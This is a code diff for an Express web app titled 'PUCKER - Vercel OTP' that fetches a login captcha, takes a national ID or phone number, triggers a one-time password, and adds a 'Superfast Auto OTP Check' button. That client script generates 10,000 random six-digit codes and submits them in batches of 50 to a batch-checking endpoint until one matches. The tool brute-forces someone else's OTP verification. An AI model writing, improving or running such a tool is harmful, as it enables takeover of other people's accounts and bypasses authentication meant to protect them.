@@ -1,6 +1,5 @@
 const express = require('express');
 const fetch = require('node-fetch');
-const path = require('path');
 const app = express();
 
 app.use(express.json());
@@ -55,12 +54,7 @@ app.get('/', async (req, res) => {
     if (!sessionData.showOtpForm && !sessionData.otpSuccess) {
         await getLoginCaptcha();
     }
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-// ফ্রন্টএন্ডে স্টেট ডাটা পাঠানোর জন্য API
-app.get('/status', (req, res) => {
-    res.json(sessionData);
+    res.send(renderHTML());
 });
 
 app.post('/', async (req, res) => {
@@ -181,6 +175,114 @@ app.post('/check-otp-batch', async (req, res) => {
 
     res.json({ success: false });
 });
+
+function renderHTML() {
+    return `
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>PUCKER - Vercel OTP</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    </head>
+    <body>
+        <div class="container mt-5">
+            <div class="row justify-content-center">
+                <div class="col-md-6">
+                    <div class="card shadow">
+                        <div class="card-header bg-dark text-white">
+                            <h4 class="text-center mb-0">PUCKER (Captcha & Auto OTP)</h4>
+                        </div>
+                        <div class="card-body">
+                            ${sessionData.otpSuccess ? `
+                                <div class="alert alert-success">${sessionData.otpSuccess}</div>
+                            ` : sessionData.showOtpForm ? `
+                                <form method="POST" id="otpForm">
+                                    <input type="hidden" name="action" value="verify_otp">
+                                    <div class="mb-3">
+                                        <label for="otp" class="form-label">Enter OTP or Auto Check</label>
+                                        <input type="text" class="form-control" id="otp" name="otp" placeholder="Enter OTP">
+                                    </div>
+                                    <div class="d-grid gap-2">
+                                        <button type="submit" class="btn btn-success">Submit OTP</button>
+                                        <button type="button" id="autoOtpBtn" onclick="startAutoCheck()" class="btn btn-warning text-dark fw-bold">⚡ Superfast Auto OTP Check</button>
+                                    </div>
+                                </form>
+                                <div id="statusBox" class="mt-3 text-center fw-bold text-danger"></div>
+                            ` : `
+                                ${sessionData.otpError ? `<div class="alert alert-danger">${sessionData.otpError}</div>` : ''}
+                                <form method="POST">
+                                    <input type="hidden" name="action" value="send_otp">
+                                    <div class="mb-3">
+                                        <label for="phone" class="form-label">Enter NID / Phone (hid)</label>
+                                        <input type="text" class="form-control" id="phone" name="phone" placeholder="Enter NID or Phone Number" required>
+                                    </div>
+                                    <div class="mb-3 text-center">
+                                        <label class="form-label">Captcha</label><br>
+                                        <div class="border p-2 bg-light d-inline-block">
+                                            ${sessionData.captchaImage ? `<img src="${sessionData.captchaImage}" alt="Captcha" class="img-fluid">` : `<small class="text-danger">Failed to load captcha. Refresh page.</small>`}
+                                        </div>
+                                    </div>
+                                    <div class="mb-3">
+                                        <label for="captcha_answer" class="form-label">Enter Captcha</label>
+                                        <input type="text" class="form-control" id="captcha_answer" name="captcha_answer" placeholder="Enter captcha text" required>
+                                    </div>
+                                    <div class="d-grid">
+                                        <button type="submit" class="btn btn-primary">Send OTP</button>
+                                    </div>
+                                </form>
+                            `}
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script>
+        async function startAutoCheck() {
+            const btn = document.getElementById('autoOtpBtn');
+            const statusBox = document.getElementById('statusBox');
+            btn.disabled = true;
+            
+            let otps = [];
+            for(let i=0; i<10000; i++) {
+                otps.push(String(Math.floor(Math.random() * 1000000)).padStart(6, '0'));
+            }
+
+            let batchSize = 50;
+            let found = false;
+
+            for (let i = 0; i < otps.length; i += batchSize) {
+                let chunk = otps.slice(i, i + batchSize);
+                statusBox.innerHTML = `Checking OTPs... Tested: ${i} / ${otps.length}`;
+
+                try {
+                    let response = await fetch('/check-otp-batch', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ otps: chunk })
+                    });
+                    let result = await response.json();
+                    if (result.success) {
+                        statusBox.className = "mt-3 text-center fw-bold text-success";
+                        statusBox.innerHTML = `Success! Matched OTP: ${result.matched_otp}`;
+                        found = true;
+                        setTimeout(() => { location.reload(); }, 1500);
+                        break;
+                    }
+                } catch (err) {}
+            }
+
+            if (!found) {
+                statusBox.innerHTML = `Could not match automatically. Please try again.`;
+                btn.disabled = false;
+            }
+        }
+        </script>
+    </body>
+    </html>
+    `;
+}
 
 if (process.env.NODE_ENV !== 'production') {
     app.listen(3000, () => console.log('Server running on port 3000'));
